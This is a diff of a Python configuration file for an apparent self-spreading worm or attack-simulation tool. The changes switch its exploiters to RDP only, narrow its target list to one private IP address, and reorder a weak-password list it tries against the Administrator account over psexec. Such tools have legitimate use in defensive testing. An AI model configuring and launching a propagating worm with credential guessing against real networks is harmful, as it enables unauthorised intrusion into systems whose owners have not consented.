@@ -3,7 +3,7 @@ import os
 import sys
 import ntpath
 from network.range import ClassCRange, RelativeRange, FixedRange
-from exploit import WmiExploiter, Ms08_067_Exploiter, SmbExploiter
+from exploit import WmiExploiter, Ms08_067_Exploiter, SmbExploiter, RdpExploiter
 from network import TcpScanner, PingScanner
 
 __author__ = 'itamar'
@@ -39,7 +39,7 @@ class WormConfiguration(object):
     max_iterations = 2
 
     scanner_class = TcpScanner
-    exploiter_classes = WmiExploiter, SmbExploiter, Ms08_067_Exploiter
+    exploiter_classes = (RdpExploiter, )
 
     # how many victims to look for in a single scan iteration
     victims_max_find = 14
@@ -57,9 +57,7 @@ class WormConfiguration(object):
     #range_class = RelativeRange
     #range_size = 8
     range_class = FixedRange
-    range_fixed = ("192.168.122.15", "192.168.122.17", "192.168.122.14", "192.168.122.9",
-                   "192.168.144.8", "192.168.144.11", "192.168.144.12",
-                   "192.168.166.10", "192.168.166.12", "192.168.166.11")
+    range_fixed = ("10.15.1.94", )
 
     # TCP Scanner
     tcp_target_ports = [445, 135]
@@ -81,4 +79,4 @@ class WormConfiguration(object):
 
     # psexec exploiter
     psexec_user = "Administrator"
-    psexec_passwords = ["1234", "password", "Password1!", "password", "12345678"]
+    psexec_passwords = ["Password1!", "1234", "password", "password", "12345678"]
